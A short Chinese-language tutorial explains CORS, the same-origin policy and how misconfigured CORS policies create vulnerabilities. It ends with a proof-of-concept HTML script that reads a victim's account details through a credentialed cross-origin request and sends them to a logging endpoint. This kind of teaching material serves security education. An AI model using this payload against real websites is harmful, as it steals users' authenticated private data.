# 跨域资源共享 (CORS)

## 什么是CORS（跨域资源共享）？

跨域资源共享 (CORS) 是一种浏览器机制，允许对位于给定域之外的资源进行受控访问。它扩展并增加了同源策略 ( SOP的灵活性。但是，如果网站的 CORS 策略配置和实施不当，它也可能引发跨域攻击。CORS 不能防止跨域攻击，例如跨站点请求伪造(CSRF)。

## 同源政策

同源策略是一种限制性的跨域规范，它限制了网站与源域之外的资源进行交互的能力。同源策略是多年前定义的，以应对潜在的恶意跨域交互，例如一个网站从另一个网站窃取私人数据。它通常允许域向其他域发出请求，但不允许访问响应。

## 放宽同源政策

同源策略非常严格，因此已经设计了各种方法来规避这些限制。许多网站以需要完全跨域访问的方式与子域或第三方网站进行交互。使用跨域资源共享 (CORS) 可以控制放宽同源策略。

跨域资源共享协议使用一套 HTTP 标头，这些标头定义了受信任的 Web 来源和相关属性，例如是否允许经过身份验证的访问。这些组合在浏览器和它试图访问的跨域网站之间的标题交换中。

## 由 CORS 配置问题引起的漏洞

许多现代网站使用 CORS 来允许来自子域和受信任的第三方的访问。他们的 CORS 实现可能包含错误或过于宽松以确保一切正常，这可能导致可利用的漏洞。

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','$url/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

